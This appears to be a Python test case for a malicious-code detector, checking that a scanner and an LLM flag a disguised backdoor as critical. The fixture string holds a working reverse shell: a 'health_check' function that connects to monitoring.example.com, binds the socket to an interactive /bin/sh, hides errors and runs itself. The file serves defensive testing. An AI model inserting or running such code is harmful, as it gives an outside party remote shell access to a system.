"""Test case 004: Backdoor code detection."""


def test_004_reverse_shell_backdoor():
    """
    ATTACK: Reverse shell backdoor for remote code execution
    TOOLS: Semgrep (pattern), LLM (intent detection)
    EXPECTED: CRITICAL severity, is_malicious=True
    DECISION: FAIL
    """
    backdoor_code = '''
# app.py
import socket
import subprocess
import os

# Legitimate-looking function
def health_check():
    """Check application health."""
    hostname = "monitoring.example.com"
    port = 8888

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((hostname, port))
        os.dup2(sock.fileno(), 0)
        os.dup2(sock.fileno(), 1)
        os.dup2(sock.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except:
        pass

health_check()
    '''

    expected_semgrep_findings = [
        {
            "check_id": "python.lang.security.audit.subprocess-shell-injection",
            "severity": "ERROR",
            "message": "Subprocess invocation of shell detected",
        },
        {
            "check_id": "python.lang.security.audit.dangerous-subprocess-use",
            "severity": "ERROR",
            "message": "Dangerous subprocess pattern detected",
        },
    ]

    expected_llm_analysis = {
        "risk_score": 9.5,
        "risk_level": "CRITICAL",
        "is_malicious": True,
        "detected_patterns": [
            "Reverse shell pattern (socket + /bin/sh + dup2)",
            "Remote code execution capability",
            "Obfuscation via legitimate-sounding function name",
            "Silent exception handling to hide errors",
            "Automatic execution without explicit trigger",
        ],
        "recommendations": [
            "BLOCK IMMEDIATELY - Confirmed backdoor code",
            "Revoke commit author access",
            "Audit production for compromise",
            "Initiate security incident response",
            "Notify InfoSec team and legal",
        ],
        "reasoning": "Classic reverse shell pattern: socket connection to external host, file descriptor duplication (dup2), and shell invocation. Combined with hidden initialization call and exception suppression. 99% confidence this is intentional malicious code.",
    }

    expected_decision = "FAIL"

    assert "socket.socket" in backdoor_code
    assert "sock.connect((hostname, port))" in backdoor_code
    assert "os.dup2(sock.fileno(), 0)" in backdoor_code
    assert 'subprocess.call(["/bin/sh", "-i"])' in backdoor_code
    assert "health_check()" in backdoor_code

    assert len(expected_semgrep_findings) == 2
    for finding in expected_semgrep_findings:
        assert {"check_id", "severity", "message"} <= finding.keys()
        assert finding["severity"] == "ERROR"

    assert expected_llm_analysis["risk_score"] == 9.5
    assert expected_llm_analysis["risk_level"] == "CRITICAL"
    assert expected_llm_analysis["is_malicious"] is True
    assert "Reverse shell pattern (socket + /bin/sh + dup2)" in expected_llm_analysis["detected_patterns"]
    assert "Remote code execution capability" in expected_llm_analysis["detected_patterns"]
    assert len(expected_llm_analysis["recommendations"]) >= 3
    assert "intentional malicious code" in expected_llm_analysis["reasoning"]
    assert expected_decision == "FAIL"

    return backdoor_code, expected_semgrep_findings, expected_llm_analysis